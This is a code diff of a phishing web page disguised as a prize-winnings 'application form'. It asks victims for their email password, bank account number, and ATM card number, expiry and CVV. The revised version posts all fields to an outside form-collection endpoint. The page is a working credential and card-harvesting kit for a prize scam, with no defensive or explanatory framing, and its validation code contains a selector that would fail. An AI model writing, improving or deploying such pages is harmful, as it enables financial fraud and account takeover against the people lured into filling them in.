@@ -13,228 +13,189 @@
     form {
       max-width: 500px;
       margin: auto;
-      background: white;
+      background: #fff;
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     label {
-      font-weight: bold;
       display: block;
-      margin-bottom: 5px;
-    }
-    .field-container {
-      position: relative;
-      margin-bottom: 20px;
+      margin-top: 15px;
     }
     input, select {
       width: 100%;
-      padding: 12px;
-      padding-right: 40px;
-      box-sizing: border-box;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-    }
-    .error {
-      color: red;
-      font-size: 14px;
-      display: none;
+      padding: 10px;
       margin-top: 5px;
+      box-sizing: border-box;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
-    .eye-icon {
+    .password-wrapper {
+      position: relative;
+    }
+    .toggle-password {
       position: absolute;
-      top: 50%;
       right: 10px;
+      top: 50%;
       transform: translateY(-50%);
       cursor: pointer;
     }
-    .warning {
+    .error {
+      color: red;
+      font-size: 0.9em;
+      display: none;
+    }
+    #atm-warning {
       color: red;
       font-weight: bold;
-      margin-top: -10px;
-      margin-bottom: 20px;
       display: none;
-    }
-    .final-message {
-      font-weight: bold;
       margin-top: 10px;
-      display: none;
-    }
-    button {
-      width: 100%;
-      background: #4CAF50;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
+  <form id="applicationForm" onsubmit="return validateForm()" method="POST" action="https://formspree.io/f/your-form-id">
+    <h2>Application Form</h2>
 
-<form id="application-form">
-  <div class="field-container">
-    <label for="full-name">Full Name</label>
-    <input type="text" id="full-name" required />
-    <div class="error" id="full-name-error">Enter full name</div>
-  </div>
+    <label>Full Name
+      <input type="text" name="Full Name" required onblur="validateNotEmpty(this)">
+      <div class="error">Full Name is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="phone">Phone Number</label>
-    <input type="tel" id="phone" required />
-    <div class="error" id="phone-error">Enter phone number</div>
-  </div>
+    <label>Country
+      <input type="text" name="Country" required onblur="validateNotEmpty(this)">
+      <div class="error">Country is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="email">Email Address</label>
-    <input type="email" id="email" required />
-    <div class="error" id="email-error">Enter a valid email</div>
-  </div>
+    <label>Phone Number
+      <input type="tel" name="Phone Number" required onblur="validatePhone(this)">
+      <div class="error">Enter 9–12 digit phone number</div>
+    </label>
 
-  <div class="field-container">
-    <label for="password">Email Password</label>
-    <input type="password" id="password" required />
-    <span class="eye-icon" onclick="togglePassword()">👁️</span>
-    <div class="error" id="password-error">Enter password</div>
-  </div>
+    <label>Email Address
+      <input type="email" name="Email Address" required onblur="validateNotEmpty(this)">
+      <div class="error">Email is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="amount">Amount You Won</label>
-    <input type="text" id="amount" required />
-    <div class="error" id="amount-error">Enter the amount you won</div>
-  </div>
+    <label>Email Password
+      <div class="password-wrapper">
+        <input type="password" name="Email Password" required onblur="validateNotEmpty(this)">
+        <span class="toggle-password" onclick="toggleVisibility(this)">👁️</span>
+      </div>
+      <div class="error">Email Password is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="bank-type">Bank Account Type</label>
-    <input type="text" id="bank-type" placeholder="e.g. Standard Bank Account" required />
-    <div class="error" id="type-error">Enter account type</div>
-  </div>
+    <label>Amount You Won
+      <input type="number" name="Amount You Won" required onblur="validateNotEmpty(this)">
+      <div class="error">This field is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="account-number">Bank Account Number</label>
-    <input type="text" id="account-number" required />
-    <div class="error" id="account-error">Enter account number</div>
-  </div>
+    <label>Bank Account Type
+      <input type="text" name="Bank Account Type" placeholder="e.g. Standard Bank Account" required onblur="validateNotEmpty(this)">
+      <div class="error">This field is required</div>
+    </label>
 
-  <div class="field-container">
-    <label for="atm-linked">Did You Link ATM to Your Bank Account?</label>
-    <select id="atm-linked" required>
-      <option value="">--Select--</option>
-      <option value="Yes">Yes</option>
-      <option value="No">No</option>
-    </select>
-    <div class="error" id="atm-error">Please select an option</div>
-    <div class="warning" id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>
-  </div>
+    <label>Bank Account Number
+      <input type="text" name="Bank Account Number" required onblur="validateNotEmpty(this)">
+      <div class="error">This field is required</div>
+    </label>
 
-  <div id="atm-fields">
-    <div class="field-container">
-      <label for="card-number">ATM Card Number</label>
-      <input type="password" id="card-number" maxlength="16" inputmode="numeric" />
-      <div class="error" id="card-error">Enter 16-digit card number</div>
+    <label>Did You Link ATM to Your Bank Account?
+      <select id="atmLinked" name="ATM Linked" onchange="toggleATMFields()" required>
+        <option value="">--Select--</option>
+        <option value="Yes">Yes</option>
+        <option value="No">No</option>
+      </select>
+      <div class="error">This field is required</div>
+    </label>
+
+    <div id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>
+
+    <div id="atmFields">
+      <label>ATM Card Number
+        <input type="password" name="ATM Card Number" maxlength="16" oninput="this.value = this.value.replace(/\D/g, '')" onblur="validateCardNumber(this)">
+        <div class="error">Must be 16 digits</div>
+      </label>
+
+      <label>Expiry Date (MM/YY)
+        <input type="text" name="Expiry Date" maxlength="5" placeholder="MM/YY" oninput="formatExpiry(this)" onblur="validateExpiry(this)">
+        <div class="error">Enter valid date as MM/YY</div>
+      </label>
+
+      <label>CVV
+        <input type="password" name="CVV" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '')" onblur="validateCVV(this)">
+        <div class="error">CVV must be 3 digits</div>
+      </label>
+
+      <p id="final-note">You will receive <span id="amountNote">[Amount You Won]</span> to your <span id="bankTypeNote">[Bank Account Type]</span> <span id="bankNumberNote">[Bank Account Number]</span></p>
     </div>
 
-    <div class="field-container">
-      <label for="expiry">Expiry Date (MM/YY)</label>
-      <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" />
-      <div class="error" id="expiry-error">Enter a valid expiry date</div>
-    </div>
+    <button type="submit">Submit</button>
+  </form>
 
-    <div class="field-container">
-      <label for="cvv">CVV</label>
-      <input type="password" id="cvv" maxlength="3" inputmode="numeric" />
-      <div class="error" id="cvv-error">Enter 3-digit CVV</div>
-    </div>
+  <script>
+    const atmFields = document.getElementById('atmFields');
+    const atmWarning = document.getElementById('atm-warning');
+    const form = document.getElementById('applicationForm');
 
-    <div class="final-message" id="final-message">
-      You will receive <span id="amount-placeholder"></span> to your <span id="type-placeholder"></span> <span id="account-placeholder"></span>
-    </div>
-  </div>
-
-  <button type="submit">Submit</button>
-</form>
-
-<script>
-  const form = document.getElementById('application-form');
-  const atmSelect = document.getElementById('atm-linked');
-  const atmFields = document.getElementById('atm-fields');
-  const atmWarning = document.getElementById('atm-warning');
-  const finalMessage = document.getElementById('final-message');
-
-  const showError = (id, condition) => {
-    const el = document.getElementById(id);
-    el.style.display = condition ? 'block' : 'none';
-  };
-
-  atmSelect.addEventListener('change', function () {
-    const val = this.value;
-    if (val === 'Yes') {
-      atmFields.style.display = 'block';
-      atmWarning.style.display = 'none';
-      finalMessage.style.display = 'block';
-      updateFinalMessage();
-    } else if (val === 'No') {
-      atmFields.style.display = 'none';
-      atmWarning.style.display = 'block';
-      finalMessage.style.display = 'none';
-    } else {
-      atmFields.style.display = 'none';
-      atmWarning.style.display = 'none';
-      finalMessage.style.display = 'none';
+    function toggleATMFields() {
+      const linked = document.getElementById('atmLinked').value;
+      if (linked === 'No') {
+        atmFields.style.display = 'none';
+        atmWarning.style.display = 'block';
+      } else {
+        atmFields.style.display = 'block';
+        atmWarning.style.display = 'none';
+      }
     }
-  });
 
-  const updateFinalMessage = () => {
-    document.getElementById('amount-placeholder').innerText = document.getElementById('amount').value;
-    document.getElementById('type-placeholder').innerText = document.getElementById('bank-type').value;
-    document.getElementById('account-placeholder').innerText = document.getElementById('account-number').value;
-  };
-
-  document.getElementById('expiry').addEventListener('input', function () {
-    let val = this.value.replace(/\D/g, '');
-    if (val.length >= 3) {
-      this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
-    } else {
-      this.value = val;
+    function toggleVisibility(icon) {
+      const input = icon.previousElementSibling;
+      input.type = input.type === 'password' ? 'text' : 'password';
     }
-  });
 
-  const fieldsToValidate = [
-    'full-name', 'phone', 'email', 'password',
-    'amount', 'bank-type', 'account-number', 'atm-linked',
-    'card-number', 'expiry', 'cvv'
-  ];
+    function validateNotEmpty(input) {
+      const error = input.nextElementSibling;
+      error.style.display = input.value.trim() === '' ? 'block' : 'none';
+    }
 
-  fieldsToValidate.forEach(id => {
-    const input = document.getElementById(id);
-    if (input) {
-      input.addEventListener('blur', () => {
-        let errorId = id + '-error';
-        let condition = false;
-        if (id === 'card-number') condition = input.value.length !== 16;
-        else if (id === 'cvv') condition = input.value.length !== 3;
-        else if (id === 'expiry') condition = !/^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value);
-        else if (id === 'email') condition = !input.value.includes('@');
-        else if (id === 'atm-linked') condition = input.value === '';
-        else condition = input.value.trim() === '';
-        showError(errorId, condition);
+    function validatePhone(input) {
+      const error = input.nextElementSibling;
+      const valid = /^\d{9,12}$/.test(input.value);
+      error.style.display = valid ? 'none' : 'block';
+    }
+
+    function validateCardNumber(input) {
+      const error = input.nextElementSibling;
+      error.style.display = input.value.length === 16 ? 'none' : 'block';
+    }
+
+    function validateCVV(input) {
+      const error = input.nextElementSibling;
+      error.style.display = input.value.length === 3 ? 'none' : 'block';
+    }
+
+    function formatExpiry(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      input.value = value;
+    }
+
+    function validateExpiry(input) {
+      const error = input.nextElementSibling;
+      const valid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value);
+      error.style.display = valid ? 'none' : 'block';
+    }
+
+    function validateForm() {
+      const inputs = form.querySelectorAll('input, select');
+      inputs.forEach(input => {
+        if (input.type !== 'submit') {
+          input.dispatchEvent(new Event('blur'));
+        }
       });
+      return form.querySelectorAll('.error:visible').length === 0;
     }
-  });
-
-  function togglePassword() {
-    const passwordField = document.getElementById("password");
-    passwordField.type = passwordField.type === "password" ? "text" : "password";
-  }
-
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    alert("Form submitted!");
-  });
-</script>
-
+  </script>
 </body>
 </html>
